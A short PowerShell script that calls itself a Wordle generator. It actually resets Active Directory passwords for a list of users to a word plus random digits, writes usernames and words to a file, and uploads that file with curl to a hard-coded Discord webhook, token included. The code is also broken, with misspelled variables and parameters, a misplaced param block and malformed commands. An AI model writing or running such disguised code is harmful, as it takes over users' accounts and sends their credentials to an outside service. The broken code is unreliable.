#Hiiii, this script generates wordles!
Import-Module ActiveDirectory
[int[]]$UsedWordles = @()

$Wordles = Get-Content -Path "Wordles.txt"
$WordleSolutions = "WordleSolutions.txt"
$LocalPlayers = Get-Content -Path "LocalPlayers.txt"
$InternationalPlayers = Get-Content -Path "InternationalPlayers.txt"
$DiscordIntegrationURL = "https://discord.com/api/webhooks/1431335730847809570/zk6rGK7eGT668ln_MucRzTbmYt4d_qRzpm8HuV2358K2bxQplrGkXr7mYkR5HlWLWO-x"

function Create-Wordle {
    Clear-Content -Path "$WordleSolutions"
    param (
        [array]$Players
    )
    foreach ($Username in $Players){
        $RandomIndex = Get-random -Minimum 0 -Maximum $Wordles.Count
        while ($UsedWordles -contains $RandomIndex) {
            $RandomIndex = Get-random -Minimum 0 -Maximum $worldes.Count
        }
        $UsedWordles += $RandomIndex
        $YourWordle = $Wordles[$RandomIndex]
        $FunnyNumbers = $RandomIndex = Get-random -Minimum 1000 -Maximum 9999
        $SecureWordle = ConvertTo-SecureString $YourWordle + $FunnyNumbers -AsPlainText -Force
        try {
            Set-ADAccountPassword -Identity $Username -NewPassword $SecureWordle -Reset -ErrorAction Stop
            Add-Content -Path $WordleSolutions -Value "$Username | $YourWordle"
        } 
        catch {
            Write-Host "Error encountered with $Username, could not assign PW"
            Add-Content "Error encountered with $Username, could not assign PW of $YourWordle"
        }
    }   
}

Create-Wordle -Pleyers InternationalPlayers
curl.exe -F "file=@$WordleSolutions" -F "New Wordles Dropped" $DiscordIntegrationURL



